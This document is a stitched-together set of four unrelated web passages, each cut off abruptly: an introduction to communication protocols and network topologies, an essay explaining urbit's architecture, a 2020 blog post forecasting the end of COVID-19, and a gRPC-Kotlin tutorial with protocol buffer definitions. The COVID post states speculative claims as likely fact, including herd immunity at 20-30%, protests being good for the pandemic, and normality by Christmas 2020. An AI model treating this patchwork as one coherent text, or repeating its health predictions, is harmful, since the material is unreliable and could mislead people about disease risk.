Many of them are <a href="https://en.wikipedia.org/wiki/Three-letter_acronym">three-letter acronyms (<abbr title="Three-Letter Acronym">TLA</abbr>)</a>,
but some are longer,
which makes them extended three-letter acronyms (<abbr title="Extended Three-Letter Acronym">ETLA</abbr>).
While I introduce most of the acronyms before using them,
you can simply hover over a <abbr title="Three-Letter Acronym">TLA</abbr> or an <abbr title="Extended Three-Letter Acronym">ETLA</abbr> with your mouse
if you forgot what they stand for.
If you are reading this on a touch device,
you have to touch the acronym instead.</p>

  <p>Let’s get right into it:
What is a protocol?</p>

</details>

<h2 id="communication-protocol">Communication protocol</h2>

<h3 id="communication-diagram">Communication diagram</h3>

<p>A <a href="https://en.wikipedia.org/wiki/Communication_protocol">communication protocol</a>
specifies how two parties can exchange information for a specific purpose.
In particular, it determines which messages are to be transmitted in what order.
If the two parties are computers,
a formal, well-defined protocol is easiest to implement.
In order to illustrate what is going on, however,
let’s first look at an informal protocol,
also known as <a href="https://en.wikipedia.org/wiki/Etiquette">etiquette</a>,
which we’re all too familiar with:</p>

<a href="https://en.wikipedia.org/wiki/Alice_and_Bob">Alice and Bob</a> engage in the human greeting protocol.
</figcaption>
</figure>

<p>This is a <a href="https://en.wikipedia.org/wiki/Sequence_diagram">sequence diagram</a>
and it highlights the temporal dimension of a protocol
in which messages are exchanged sequentially.</p>

<h3 id="communication-parties">Communication parties</h3>

<p>It also illustrates that communication is commonly initiated by one party,
whereby the recipient responds to the requests of the initiator.
Please note that this is only the case for one-to-one protocols,
in which each message is intended for a single recipient.</p>

<details>
  <summary id="broadcasting-and-information-security">
Broadcasting and information security
</summary>

  <p>There are also one-to-many protocols for <a href="https://en.wikipedia.org/wiki/Broadcasting">broadcasting</a>.
These are typically one-way protocols,
in which the recipients do not acknowledge the receipt of the transferred data.
Examples for such protocols are analog radio
or churches ringing their bells to indicate the time of day.
Both in the case of a single recipient and in the case of a broad target audience,
anyone with access to the physical medium and the right sensors receives the signal.
The difference is simply that,
in the former case,
entities ignore the messages
which are not addressed to them.
If the messages are not encrypted,
others can still read them, though.
And if the messages are not authenticated,
a malicious party might be able to alter them in transit.
Even when messages are encrypted and authenticated,
their exchange can still be interrupted,
by not relaying some messages
or by <a href="https://en.wikipedia.org/wiki/Radio_jamming">jamming</a> the signal.
The properties Confidentiality, Integrity, and Availability
form the so-called <abbr title="Confidentiality, Integrity, and Availability">CIA</abbr> triad of <a href="https://en.wikipedia.org/wiki/Information_security">information security</a>.</p>

</details>

<h3 id="communication-channel">Communication channel</h3>

<p>The above greeting protocol is used among humans
to establish a <a href="https://en.wikipedia.org/wiki/Communication_channel">communication channel</a> for a longer exchange.
In technical jargon,
such an exchange in preparation for the actual communication is called a <a href="https://en.wikipedia.org/wiki/Handshaking">handshake</a>.
The greeting protocol checks the recipient’s availability and willingness to engage in a conversation.
When talking to someone you have never spoken before,
it also ensures that the recipient understands your language.
I’ve chosen these two examples for their figurative value.
Why we actually <a href="https://en.wikipedia.org/wiki/Greeting">greet</a> each other
is mainly for different reasons:
To show our good intentions by making our presence known to each other,
to signal sympathy and courtesy by asking the superficial question,
and to indicate our relative social status to each other and to bystanders.
Another benefit of asking such a question is that,
even though it’s very shallow,
it makes the responder more likely to do you a favor
due to the psychological effect of
<a href="https://www.influenceatwork.com/principles-of-persuasion/#consistency">commitment and consistency</a>.</p>

<p>In order to detect transmission errors,
computers typically append a <a href="https://en.wikipedia.org/wiki/Checksum">checksum</a> to each message,
which the recipient then verifies.
The need to <a href="https://en.wikipedia.org/wiki/Retransmission_(data_networks)">retransmit</a> messages
can be reduced by adding redundancy to messages
so that the recipient can <a href="https://en.wikipedia.org/wiki/Error_detection_and_correction">detect and correct small errors</a> on their own.
A simple and very inefficient way of doing this is to repeat the content within each message several times.</p>

<h3 id="connection-loss">Connection loss</h3>

<p>It can also happen that a party loses their connection permanently,
for example by moving too far away for the signal to reach the recipient.
Since a conversation requires some attention from the communication partner,
abandoning a conversation unilaterally without notifying the other party
can be misused to block them from talking to someone else for some time.
In order to avoid binding resources for a prolonged period of time
and thereby potentially falling victim to a so-called
<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attack</a>,
computers drop connections after a configurable duration of inactivity:</p>

  <figcaption>
Bob’s second message (in blue) arrives after his third message (in green).
</figcaption>
</figure>

<p>The solution for this is to enumerate all messages,
to reorder them on arrival,
and to ask the other party to retransmit any missing messages,
as we saw <a href="#data-corruption">above</a>.</p>

<h3 id="lack-of-interoperability">Lack of interoperability</h3>

<p>Besides defining the <a href="https://en.wikipedia.org/wiki/Syntax">syntax</a> (the format),
the <a href="https://en.wikipedia.org/wiki/Semantics">semantics</a> (the meaning),
and the order of the messages,
a protocol should also specify how to handle anomalies like the above.
Ambiguity in a standard
and willful deviation therefrom
result in incompatibilities between different implementations.
In combination with a lack of established standards in many areas,
which often leads to uncoordinated efforts by various parties,
incompatibilities are quite common in computer systems,
unfortunately.
This causes a lot of frustration for users and programmers,
who have to find workarounds for the encountered limitations,
but this cannot be avoided in a free market of ideas and products.</p>

<h2 id="network-topologies">Network topologies</h2>

<h3 id="communication-network">Communication network</h3>

<p>In practice, there are almost always more than two parties
who want to communicate with each other.
Together with the connections between them,
they form a <a href="https://en.wikipedia.org/wiki/Telecommunications_network">communication network</a>.
For the scope of this article,
we’re only interested in symmetric networks,
where everyone who can receive can also send.
This is not the case for analog radio and television networks,
where signals are broadcasted unidirectionally from the sender to the receivers.
In the case of our symmetric networks,
two entities are part of the same network
if they can communicate with each other.
If they cannot reach each other,
they belong to separate networks.</p>

<h3 id="nodes-and-links">Nodes and links</h3>

<p><a href="https://en.wikipedia.org/wiki/Node_(networking)">Nodes</a> are the entities
that communicate with each other over communication <a href="https://en.wikipedia.org/wiki/Data_link">links</a>.
We can visualize this as follows:</p>

  <figcaption>

</figcaption>
</figure>

<p>The terminology is borrowed from <a href="https://en.wikipedia.org/wiki/Graph_theory">graph theory</a>,
where nodes are also called vertices
and links are also called edges.
The technical term for the structure of a network is <a href="https://en.wikipedia.org/wiki/Network_topology">topology</a>.
Different arrangements of nodes and links lead to different characteristics of the resulting network.</p>

<h3 id="fully-connected-network">Fully connected network</h3>

<p>A network is said to be fully connected
if every node has a direct link to every other node:</p>

A fully connected network with five nodes and ten links.
</figcaption>
</figure>

<p>In graph theory, such a layout is known as a <a href="https://en.wikipedia.org/wiki/Complete_graph">complete graph</a>.
Fully connected networks scale badly
as the number of links grows quadratically with the number of nodes.
You might have encountered the formula for the number of links before:
n × (n – 1) / 2, with n being the number of nodes in the network.
As a consequence, this topology is impractical for larger networks.</p>

<h3 id="star-network">Star network</h3>

<p>The number of links can be reduced considerably by introducing a central node,
which forwards the communication between the other nodes.
In such a star-shaped network,
the number of links scales linearly with the number of nodes.
In other words,
if you double the number of nodes,
you also double the number of links.
In a fully connected network, you would have quadrupled the number …</p></article></div></div>

<p>it’s been a long time since my last post. in the intervening year i have remained very interested in urbit, completed the introductory hoon course, and began organizing a regional <a href="https://www.meetup.com/Urbit-DFW">meetup group</a>. i’ve also acquired a better technical understanding of the system design. i wrote this essay for our meetup group’s inaugural presentation; you can watch it on youtube <a href="https://www.youtube.com/watch?v=RI1TS0PWQAA">here</a>.</p>

<p>i’ve gotten pretty positive feedback from urbit novices about this, so i hope it’s helpful for anybody else who stumbles upon it. if you notice something that needs a correction, please reach out to me!</p>

<h3 id="introduction">introduction</h3>

<p><a href="http://hyperstition.al/img/slides/slide1.png"><img src="http://hyperstition.al/img/slides/slide1.png#full-center" alt=""></a>urbit is a personal server. that is to say, it’s a computer acts as an agent on your behalf to talk to other computers on the internet. right now, we all use computers that belong to megacorporations and serve their interests; when you log into facebook and talk to your friend, all the real computation and storage is done on servers that belong to facebook. in a very real sense, they own your data. it’s very difficult to avoid at this point. the goal of urbit is to address the technical issues that led to this state of affairs, so that everybody can run and control their own software. there are a lot of projects that have tried to address one or two of the many problems that urbit tries to solve, but i doubt there is any other current project as ambitious or farsighted. urbit is an open source project primarily developed by a company called tlon, in san francisco, and there’s another company in austin also working full-time to develop it, called urbit.live.</p>

<p>urbit is famously difficult to describe; this is due to a combination of complexity, an opaque naming scheme, and its genuinely novel ideas and clever recombinations of old ones. it can seem like it leaked into our world from an alternate timeline. thinking about urbit requires you to modify a lot of conceptual models that you’re used to using to think about computers and the internet. i’m not any kind of expert on any on these subjects but i’ve spent a decent amount of time trying to digest the technical parts of urbit, and my goal here is to convey that understanding to you, and connect the technical decisions and constraints to the problems being solved. this presentation is aimed at someone who has heard of urbit but doesn’t quite get it yet. so, to begin, here is a list of questions:</p>

<p>what if your computer was deterministic – a minimal, strictly defined mathematical function that given an event sequence, always ended up in the same state? how would it be different from the computers we’re used to, and what advantages might it have? what would a network of these computers look like? what if that computation was standardized, so that an app i write today runs on another arbitrary computer in ten years, or the computer i’m using now still works when i pass it down to my kids?</p>

<p>why can’t i take my social graph with me when i leave facebook? why isn’t facebook just a protocol? why has the internet transformed from a peer-to-peer assemblage into a surveillance panopticon? why are we doing all our computation on some corporation’s mainframe as if it’s the 70’s, while they build dossiers on us? what happened to the dream of using networked computers to liberate individuals?</p>

<p>how do you grow social software to internet-scale without running into the obstacles produced by the conflicting values of different communities? how do we preserve the freedoms of association and speech while still allowing for the enforcement of values within groups? how do you disincentivize spam and bad actors in an open system?</p>

<p>as you may guess, some of the goals of urbit are to answer these questions and challenges in an elegant way. i will give you a cursory overview of the system and then talk more about the ideas it exists to implement.</p>

<p><a href="http://hyperstition.al/img/slides/slide2.png"><img src="http://hyperstition.al/img/slides/slide2.png#full-center" alt=""></a></p>

<h3 id="the-stack">the stack</h3>

<p>these problems are very difficult to address within the constraints of the current internet, but urbit is an entire networked computing stack from scratch. the core thesis of urbit is that all of these are technically solvable problems if you approach them at the right scale. i’ll try working from the bottom up here and give a cursory overview without getting too bogged down in details. i apologize if this is a little dense, but bear with me and it should cohere. the second half of this is less technical.</p>

<p><a href="http://hyperstition.al/img/slides/slide3.png"><img src="http://hyperstition.al/img/slides/slide3.png#full-center" alt=""></a></p>

<p>nock is a turing-complete function. you can think of it as the functional assembly code that underpins the entire urbit stack. its formal spec is typically described as “small enough to fit on a t-shirt”, and it has 12 opcodes, or basic instructions. this is a couple of orders of magnitude smaller than the x86_64 instruction set that your pc uses. nock is pared down to the minimum elements of what might make up a useful computer; for instance, it defines a single recursive datatype, a binary tree of integers; and its only arithmetic operator is increment.</p>

<p>but a combinator whose only arithmetic operator is increment sounds unusable as a computer; how do you subtract, for instance?</p>

<p>as you may know, if your computer can increment, you can derive all of the rest of the math you’d like out of that operation – for instance decrementing x by incrementing up to x-1. this is extremely inefficient, but urbit has a cool hack for this: the standard library has all the operations you would expect implemented as “jets”, written in optimized c, which manipulate values in a formally equivalent manner to a specification written in nock. that is to say, if you ran an incredibly slow version of your urbit without jets that did all its math the hard way but otherwise had the same inputs, its state would end up identical to the jetted version.</p>

<p><a href="http://hyperstition.al/img/slides/slide4.png"><img src="http://hyperstition.al/img/slides/slide4.png#full-center" alt=""></a></p>

<p>nock is virtualized with an interpreter programmed in c called vere. vere sits between your urbit and your computer, handing over keyboard and packet inputs to your urbit, and outputs back to your unix computer to be displayed in its terminal or sent off through its network interface. right now urbit runs as a unix process, but one can imagine urbit on hardware meant to run nock and jets directly. for now, vere is what runs your urbit on your macbook or vps.</p>

<p><a href="http://hyperstition.al/img/slides/slide5.png"><img src="http://hyperstition.al/img/slides/slide5.png#full-center" alt=""></a></p>

<p>hoon is the system programming language for the urbit operating system, arvo. hoon is a strongly-typed, functional higher-level language that compiles to nock; it’s effectively a collection of nock macros. expressions are denoted with ‘runes’, which are digraphs of ascii special characters. hoon code is made up of these expressions and as a result can be kind of scary to look at, but i promise it’s not as hard to use as you may think!</p>

<p><a href="http://hyperstition.al/img/slides/slide6.png"><img src="http://hyperstition.al/img/slides/slide6.png#full-center" alt=""></a></p>

<p>arvo is the urbit operating system. it has a minimal kernel, around 1000 lines of code, plus some kernel modules, called vanes. arvo’s vanes handle the networking, apps, a web server, a version-controlled file system, etc. your urbit instance’s arvo begins with a blank slate, then processes any events (packets and keystrokes), writes them to a log, and outputs its effects, producing new events and its new state. if you play back this log, your urbit will end up in an identical state.</p>

<p>urbit is deterministic. your urbit’s state is one giant binary tree that is modified by an event log. nock takes your state and some new event, applies the event to the state, and outputs a new state and a list of effects. arvo orchestrates events between vanes.</p>

<p><a href="http://hyperstition.al/img/slides/slide7.png"><img src="http://hyperstition.al/img/slides/slide7.png#full-center" alt=""></a></p>

<p>the urbit network protocol &amp; kernel module is called ames. ames is peer-to-peer and encrypted, and runs over udp. it has a global immutable namespace; an instance’s name is permanent, and is both an identity and routing address.
urbit’s address space is 128-bit, just like ipv6. the total number of addresses (or ‘ships’) is effectively unlimited. however, urbit’s address space is also partitioned into classes with different privileges. 8-bit address ships are called galaxies, which are core infrastructure nodes that sign software updates. underneath galaxies are stars, 16-bit address ships that act as routing infrastructure. beneath stars are planets, which are ships meant for individual humans. planet addresses are 32-bit like ipv4, so there’s about 4.2 billion of them. galaxies issue stars, and stars issue planets.</p>

<p>urbit uses a base-256 phonemic scheme for pronouncible numbers called @p. galaxies have single-syllable names like ~zod; stars are two-syllable, like ~marzod. planets have two two-syllable names, like ~dalsum-simreg. this is your identity – think of it as a combination ip &amp; email address. the words are human-memorable and sound like cool sci-fi names.</p>

<p><a href="http://hyperstition.al/img/slides/slide8.png"><img src="http://hyperstition.al/img/slides/slide8.png#full-center" alt=""></a></p>

<p>how do you own these names? urbit’s public key infrastructure is a set of ethereum contracts collectively called azimuth. azimuth acts as an ownership registry for ships and consensus mechanism for network governance. if you receive a ship, your proof of ownership is an erc-721 token, which is an ethereum standard for non-fungible tokens. you own this token like you own bitcoin; as long as you have the master password, it belongs to you forever.</p>

<p>azimuth technically exists outside of urbit as a general-purpose pki; urbit just uses it as a source of truth. if you dislike ethereum for political or technical reasons, keep in mind that it’s not a permanent intrinsic part of how urbit works, it’s just the current scheme – though in my opinion it’s a pretty elegant solution.</p>

<h3 id="philosophy">philosophy</h3>

<p>urbit has very strong opinions, and some design decisions that might not make immediate sense. this is a system meant to replace the internet we’ve spent half a century building; it needs some really compelling wins to be serious.</p>

<p>for instance, why make a computer with such a minimal core? so you can freeze it and standardize it.</p>

<p><a href="http://hyperstition.al/img/slides/slide9.png"><img src="http://hyperstition.al/img/slides/slide9.png#full-center" alt=""></a></p>

<p>a basic idea underlying the design of urbit is that many of the problems we have today with the way networked computers work is that the technologies composing them accrued in layers atop each other in ways that produce unforeseen conflicts. …</p></div></div>

				<div id="speakaboutWrapper"><p>Ok so this is not at all agreed upon. The CDC has<a href="https://www.cdc.gov/coronavirus/2019-ncov/covid-data/mathematical-modeling.html"> twenty-one different models</a> forecasting cases and deaths. Those forecasts are only shown on the CDC website to predict what will happen for about the next two weeks- until September 12th. The models are from various universities and teams- MIT has two models, Harvard has a model, Columbia University, Hopkins, Georgia Tech, Notre Dame, etc. etc. (the usual suspects). And even in that short time frame, they are all over the place.</p>



<p>Why are they all over the place? Well the biggest thing is that they make different assumptions about social distancing and behavior- it will continue as it is or change. Also some of them are assuming herd immunity, ahem, and some not. The Columbia-UNC model appears to assume herd immunity as it is predicting a decline in cases and not saying anything about social distancing (see below).</p>



<figure><img loading="lazy" width="1024" height="218" src="https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-1024x218.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-1024x218.png 1024w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-300x64.png 300w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-768x163.png 768w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-1536x326.png 1536w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-2048x435.png 2048w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-1200x255.png 1200w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-1400x297.png 1400w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-960x204.png 960w, https://realscience.community/wp-content/uploads/2020/08/Columbia-UNC-2000x425.png 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>But, regardless of that mess to sort out, [which I will sort out- I just don’t want to go through 21 different models atm to write this post- that’s going to take a while], they are only going through September 12th so who cares? That doesn’t tell us how this ends.</p>



<figure><blockquote><p>I actually have been in a pretty good mood lately because I think this ends soon and with less deaths than I originally thought. That doesn’t mean that this was in any way ok or a lot of people won’t have died. This was most definitely NOT ok, any of it. 220,000 people have already died- more than 6X the Flu. And this was preventable. So 100% not ok.</p></blockquote></figure><p>But here is what I think will happen. I think herd immunity is happening and I actually think that my original idea and<a href="https://www.bcg.com/en-us/publications/2020/protecting-vulnerable-populations-protects-all-populations"> the idea Boston Consulting Group’s (BCG) COVID-19 team was promoting</a>, actually naturally is occurring. I think the public health messaging got out there and the highest risk people are being more shielded than in the beginning of the pandemic. Whether that’s them being more careful or their families being more careful around them, the age of cases has dropped and thus the death rate is dropping. Proud of you America. Your government sucks but you are looking out for the vulnerable people on your own. </p>



<p>I actually think the protests were probably in some senses GOOD for this pandemic because the people protesting were by and large low-risk for dying of COVID. They were younger and probably most didn’t have a condition that put them at high risk- like asthma or cancer. Therefore the herd immunity we are seeing at 20-30% is a healthier 20-30% of the population. They are shielding the more vulnerable people from COVID with their immunity. That’s not to say anything about disparities- that’s a whole other can of worms that is terrible and I won’t get into here. </p>



<p>But bottom line? Cases are dropping and deaths are not as bad as we thought. Achieving herd immunity at 20-30% is huge! It is an unexpected and really lucky turn of events. I thought it would be at 60-70% and have a lot more deaths involved. </p>

<figure><blockquote><p>The herd immunity threshold depends on how responsible people are being. More mask wearing, more distancing, and more protecting of high-risk people will make herd immunity possible at lower levels. It will also save lives. So we need to keep doing this until the cases drop completely. </p></blockquote></figure><figure><img loading="lazy" width="1024" height="652" src="https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1024x652.png" alt="" srcset="https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1024x652.png 1024w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-300x191.png 300w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-768x489.png 768w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1536x978.png 1536w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1200x764.png 1200w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-942x600.png 942w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-960x611.png 960w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior.-1884x1200.png 1884w, https://realscience.community/wp-content/uploads/2020/08/RT-depends-on-societal-behavior..png 2038w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>From UCSF grand rounds talk by Dr. Trevor Bedford.</figcaption></figure><p>I think it won’t be that much longer though.

I know it’s a lot to ask. <a href="https://www.nature.com/articles/d41586-020-02439-6?code=37bf7526-f76a-4c4e-9ed1-c9af8f9e72de&amp;error=cookies_not_supported">Depression rates have doubled and anxiety is through the roof</a>.<strong> </strong>And the economy is suffering.</p>



<p>But I think cases will have dropped enough and we will be immune enough for things to feel a lot more normal by Christmas. And a vaccine will be here in ~January 2021. The memorial day 2021 parties are going to be spectacular. This is what Wuhan province looks like- you know the place in China that originally locked down and then eradicated COVID. It’s off the hook there. Please someone start planning this pool party for me. Really- that looks amazing.</p>

        <p>In this blog post, we will explore how to use gRPC with Kotlin coroutines on both the server and client (Android) using the <a href="https://github.com/grpc/grpc-kotlin">gRPC-Kotlin</a> library.</p>

<h2 id="what-is-grpc">What is gRPC?</h2>

<p><a href="https://grpc.io/docs/what-is-grpc/introduction/">gRPC</a> is a framework by Google for making RPC requests. It allows you to call a method on the server as if it was a local method on the client. The server defines all the different types of RPC requests the client could make using protocol buffers. <a href="https://developers.google.com/protocol-buffers">Protocol buffers</a> is a data formatting language. It allows you to specify the request and response from rpc calls.</p>

<p>gRPC has support for clients and servers that are built using different programming languages.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-1.png" alt="client-server-diagram"></p>

<h2 id="use-case">Use Case</h2>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-2.png" alt="client-server-user-case"></p>

<p>Assume we are building an Android app that allows users to explore locations on map as they traverse from one location to another. The user may be able to check-in to a place or chat with others at the location. The user could also explore new venues such as restaurants and retail stores nearby. How could we build a server and client for this hypothetical use case?</p>


<h2 id="building-grpc-server">Building gRPC Server</h2>

<p>There are many open source libraries that could be used to build a gRPC server and client such as <a href="https://github.com/square/wire">Wire</a>, <a href="https://github.com/marcoferrer/kroto-plus">Kroto-Plus</a> and <a href="https://github.com/grpc/grpc-kotlin">gRPC-Kotlin</a>. Let’s explore how to use gRPC-Kotlin to build a gRPC server for our case.</p>

<h3 id="rpc-calls">RPC Calls</h3>

<p>The first step is to define the RPC calls a client could make. We’ll use protocol buffers to define the request and response. The RPC calls are defined in a file with an extension <code>.proto</code>. All RPC calls are defined in a service. The snippet below defines <code>VenueService</code> using the <a href="https://developers.google.com/protocol-buffers/docs/proto#services"><code>service</code></a> keyword. The proto file also specifies the version of protocol buffer to use. I have specified to use <a href="https://developers.google.com/protocol-buffers/docs/proto3">protocol buffer version 3</a>.</p>

<div><div><pre><code><span>syntax</span> <span>=</span> <span>"proto3"</span>

<span>service</span> <span>VenueService</span> <span>{</span>

<span>}</span>
</code></pre></div></div>

<h4 id="unary-rpc-call">Unary RPC Call</h4>

<p>The first RPC call type we will define is a simple client and server request. Suppose in our use case, we wanted to get a venue (restaurant, retail store) at a particular location. We could define this RPC call as follows.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>The <code>GetVenue</code> method takes in a <code>Location</code> message and returns a <code>Venue</code>.</p>

<div><div><pre><code><span>message</span> <span>Location</span> <span>{</span>
   <span>double</span> <span>latitude</span> <span>=</span> <span>1</span><span>;</span>
   <span>double</span> <span>longitude</span> <span>=</span> <span>2</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>A type is defined using the <code>message</code> keyword. <code>Location</code> is a message that has two fields - latitude and longitude. These fields have a type of <code>double</code>. The <a href="https://developers.google.com/protocol-buffers/docs/proto#scalar">Protocol Buffer Guide</a> defines all the supported types such as enums or strings. Each field is assigned a unqiue number starting from 1. For each field defined subsequently, the unique number is incremented.</p>

<div><div><pre><code><span>message</span> <span>Venue</span> <span>{</span>
   <span>string</span> <span>name</span> <span>=</span> <span>1</span><span>;</span>
   <span>Location</span> <span>location</span> <span>=</span> <span>2</span><span>;</span>
   <span>VenueType</span> <span>venueType</span> <span>=</span> <span>3</span><span>;</span>

   <span>enum</span> <span>VenueType</span> <span>{</span>
     <span>Landmark</span> <span>=</span> <span>0</span><span>;</span>
     <span>Driving_Range</span> <span>=</span> <span>1</span><span>;</span>
     <span>Golf_Course</span> <span>=</span> <span>2</span><span>;</span>
     <span>Restaurant</span> <span>=</span> <span>3</span><span>;</span>
     <span>Retail</span> <span>=</span> <span>4</span><span>;</span>
   <span>}</span>

   <span>int64</span> <span>checkins</span> <span>=</span> <span>4</span><span>;</span>
   <span>int64</span> <span>reviews</span> <span>=</span> <span>5</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>A <code>Venue</code> is represented as a message above. The name of the venue is a <code>string</code>. It references an existing message <code>Location</code> to return the latitude and longitude of the venue. The third field is an enum which represents the type of venue - landmark, driving range, restaurant or retail store. Each enum is specified with a unique number starting from 0. The last two fields checkins and reviews are int scalar types. In Kotlin, they map to a Long.</p>

<p>We have specified a simple unary RPC call that returns a venue based on a location.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>GetVenue</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>Venue</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<h4 id="server-streaming">Server Streaming</h4>

<p>The <code>GetVenue</code> RPC call above returns only one response. But, we could define RPC calls where the server returns a stream of data. Assume we wanted to define an RPC where the client gives a location and the server returns a stream of venues nearby.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-3.png" alt="server-side-streaming"></p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

    <span>rpc</span> <span>listVenues</span><span>(</span><span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Venue</span><span>)</span> <span>{</span> <span>}</span>

<span>}</span>
</code></pre></div></div>

<p>We have added a server streaming RPC call to the service above. What’s new about this call specification? The return type <code>Venue</code> is marked with a <code>stream</code> keyword. This specifies that the returned data from the server will stream venues. The server will wait until the client send a message. Once it has a message, it will return a stream of responses.</p>

<h4 id="client-streaming">Client Streaming</h4>

<p>We saw in the server side streaming example that server was returning a stream of messages. The client only had sent one message. Client could also send a stream of messages.</p>

<p>Assume we wanted to return a summary of all the venues a person visted during their trip. For this use case, the client will have to send a stream of locations as they go from one location to another.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-4.png" alt="client-side-streaming"></p>

<p>In this diagram, the client is sending a stream of locations to the server. The server will wait until al the messages are received and send back a summary back to the client.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>RecordTrip</span><span>(</span><span>stream</span> <span>Location</span><span>)</span> <span>returns</span> <span>(</span><span>TripSummary</span><span>)</span> <span>{}</span>

<span>}</span>
</code></pre></div></div>

<p>The example above defines a <code>RecordTrip</code> rpc call that conforms to our use case. The <code>stream</code> keyword is used inside the parentheses to define the client side streaming RPC call.</p>

<h4 id="bidirectional-streaming">Bidirectional Streaming</h4>

<p>Both the client and server can be streaming messages. This use case is good for implementing a chat room. A client could stream messages sent by a user. The server could return replies from other users.</p>

<p><img src="https://codingwithmohit.com/assets/images/grpc-kotlin-coroutines/grpc-kotlin-coroutines-5.png" alt="bidirectional-streaming"></p>

<div><div><pre><code><span>import</span> <span>"google/protobuf/timestamp.proto"</span><span>;</span>

<span>service</span> <span>VenueService</span> <span>{</span>

   <span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>

<span>}</span>

<span>message</span> <span>Comment</span> <span>{</span>
   <span>string</span> <span>text</span> <span>=</span> <span>1</span><span>;</span>
   <span>google.protobuf.Timestamp</span> <span>sentTime</span> <span>=</span> <span>3</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The rpc method <code>chat</code> takes a stream of comments and returns a replies. A comment is a message that has text and a timestamp for when it was sent. A <a href="https://developers.google.com/protocol-buffers/docs/reference/java/com/google/protobuf/Timestamp">Timestamp</a> is well known types in protocol buffers. In order to use it, you have to import the <a href="https://github.com/protocolbuffers/protobuf/blob/master/src/google/protobuf/timestamp.proto"><code>timestamp.proto</code></a> file.</p>

<div><div><pre><code><span>import</span> <span>"google/protobuf/timestamp.proto"</span><span>;</span>
</code></pre></div></div>

<p>In the rpc method, both request and response comments are marked with the <code>stream</code> keyword. The server could wait until comments are received in order to send all the replies. Or, the server could send a reply as it receives a comment. Its up to you how you want to implement the streaming logic.</p>

<div><div><pre><code><span>rpc</span> <span>chat</span><span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>returns</span> <span>(</span><span>stream</span> <span>Comment</span><span>)</span> <span>{}</span>
</code></pre></div></div>

<p>We’ve defined all the different types of RPC calls for our use case. How do we implement our logic to execute for the RPC calls?</p>

<h3 id="implementing-rpc-calls">Implementing RPC Calls</h3>

<p>When we run our build, the protocol buffer compiler will run. It will generates base implementation class for us from service.</p>

<div><div><pre><code><span>abstract</span> <span>class</span> <span>VenueServiceCoroutineImplBase</span><span>(</span><span>coroutineContext</span><span>)</span> <span>{</span>

  <span>open</span> <span>suspend</span> <span>fun</span> <span>getVenue</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Venue</span>

  <span>open</span> <span>fun</span> <span>listVenues</span><span>(</span><span>request</span><span>:</span> <span>Location</span><span>):</span> <span>Flow</span><span>&lt;</span><span>Venue</span><span>&gt;</span>

  <span>open</span> <span>suspend</span> <span>fun</span> <span>recordTrip</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Location</span><span>&gt;):</span> <span>TripSummary</span>

  <span>open</span> <span>fun</span> <span>chat</span><span>(</span><span>requests</span><span>:</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;):</span> <span>Flow</span><span>&lt;</span><span>Comment</span><span>&gt;</span>

<span>}</span>
</code></pre></div></div>

<p>Each open method in the generated class above corresponds to an RPC call. In order to add our own logic when these methods are called, we will create a service that inherits this class.</p>

<div><div><pre><code><span>class</span> <span>VenueGrpcService</span><span>:</span> <span>VenueServiceGrpcKt</span><span>.</span><span>VenueServiceCoroutineImplBase</span><span>()</span> <span>{</span>


<span>}</span>
</code></pre></div></div>

<h4 id="unary-rpc-call-1">Unary RPC Call</h4>

<p>Our unary RPC call took a location and returned a venue.</p>

<div><div><pre><code><span>service</span> <span>VenueService</span> <span>{</span>

